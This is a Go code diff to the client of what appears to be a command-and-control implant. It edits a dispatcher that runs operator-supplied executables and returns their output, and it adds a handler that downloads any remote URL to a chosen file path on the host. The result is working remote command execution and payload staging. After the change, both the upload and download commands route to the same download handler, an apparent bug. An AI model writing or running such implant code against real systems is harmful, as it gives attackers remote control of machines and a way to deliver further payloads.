@@ -2,6 +2,9 @@ package client
 
 import (
 	"fmt"
+	"io"
+	"net/http"
+	"os"
 	"os/exec"
 
 	"github.com/dobin/antnium/model"
@@ -30,7 +33,7 @@ func (s *CommandExec) execute(command *model.CommandBase) error {
 	} else if command.Command == "fileupload" {
 		command.Response = s.actionFiledownload(command.Arguments)
 	} else if command.Command == "filedownload" {
-		command.Response = s.actionFileupload(command.Arguments)
+		command.Response = s.actionFiledownload(command.Arguments)
 	} else {
 		command.Response["response"] = "generic"
 	}
@@ -52,15 +55,12 @@ func (s *CommandExec) actionExec(cmdArgument model.CmdArgument) model.CmdRespons
 	ret := make(model.CmdResponse)
 	args := make([]string, 3)
 
-	// Check Input
+	// Check and transform input
 	executable, ok := cmdArgument["executable"]
 	if !ok {
-		fmt.Println("No 1")
 		ret["error"] = "No executable given"
 		return ret
 	}
-
-	// Transform Input
 	arg1, ok := cmdArgument["arg1"]
 	if ok {
 		args = append(args, arg1)
@@ -70,7 +70,7 @@ func (s *CommandExec) actionExec(cmdArgument model.CmdArgument) model.CmdRespons
 		args = append(args, arg2)
 	}
 
-	// Execute and return
+	// Execute and return result
 	cmd := exec.Command(executable, args...)
 	stdout, err := cmd.Output()
 	ret["stdout"] = string(stdout)
@@ -82,7 +82,40 @@ func (s *CommandExec) actionExec(cmdArgument model.CmdArgument) model.CmdRespons
 
 func (s *CommandExec) actionFiledownload(cmdArgument model.CmdArgument) model.CmdResponse {
 	ret := make(model.CmdResponse)
-	ret["response"] = "download answer"
+
+	// Check and transform input
+	remoteurl, ok := cmdArgument["remoteurl"]
+	if !ok {
+		ret["error"] = "No remoteurl given"
+		return ret
+	}
+	destination, ok := cmdArgument["destination"]
+	if !ok {
+		ret["error"] = "No destination given"
+		return ret
+	}
+
+	resp, err := http.Get(remoteurl)
+	if err != nil {
+		ret["err"] = err.Error()
+		return ret
+	}
+
+	defer resp.Body.Close()
+	out, err := os.Create(destination)
+	if err != nil {
+		ret["err"] = err.Error()
+		return ret
+	}
+	defer out.Close()
+
+	written, err := io.Copy(out, resp.Body)
+	if err != nil {
+		ret["err"] = err.Error()
+		return ret
+	}
+
+	ret["response"] = fmt.Sprintf("Written %d bytes", written)
 	return ret
 }
 
